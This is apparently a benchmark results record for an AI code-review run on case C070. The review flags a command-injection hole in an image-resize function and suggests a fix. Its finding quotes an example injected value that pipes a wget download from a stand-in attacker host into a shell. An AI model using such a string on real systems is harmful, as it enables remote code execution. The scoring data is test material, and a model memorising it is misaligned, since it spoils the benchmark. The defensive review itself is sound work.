@@ -1,0 +1,95 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.6",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "7695481624f1",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 86.0,
+  "setup_seconds": 0.1,
+  "total_seconds": 86.1,
+  "usage": {
+    "in": 62536,
+    "cache_read": 58496,
+    "cache_write": 0,
+    "out": 4452,
+    "source": "cli"
+  },
+  "cost_usd": 0.181032,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "Interpolating `filter` and `src` into `child_process.exec` runs them through a shell. A filter such as `Lanczos; wget http://evil.example/x | sh` or a path containing `$(...)` / `` `...` `` executes as a host command. ImageMagick `-filter` takes a single argv token, so pass each value through `execFile` (and restore that import):\n\n```suggestion\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n```"
+    }
+  ],
+  "summary": "Command injection on the new `exec` path \u2014 this needs to be fixed before merge.\n\n`resize` previously invoked ImageMagick with `execFile` and an argv array, so `src` could not break out of the process arguments. This change switches to `child_process.exec` and interpolates `src`, `filter`, and `w` into a shell string. The new `filter` argument is documented as a user-composed expression and is unquoted; `src` is only double-quoted, which still expands `$()` and backticks. That is a remote-code-execution primitive on any host that calls `resize` with untrusted input.\n\nKeep `execFile` and pass `-filter` as its own argv element. No in-repo callers of `resize` showed up, so the new required middle parameter is an untested public-signature change as well; existing `resize(src, w)` call sites would treat a width number as the filter string.\n\n**Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 40,
+  "budget": {
+    "tier": "critical",
+    "profile": "auto",
+    "turns": 40,
+    "alias": "deep",
+    "model": "grok-4.6",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 100,
+    "patch_bytes": 200000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The patch replaces execFile with exec and interpolates unsanitized `src` and `filter` into a shell command string, enabling command injection. Base used argv-array execFile; the new API exposes attacker-controllable shell metacharacters."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.941,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 1261,
+      "out": 377
+    },
+    "cost_usd": 0.005987
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
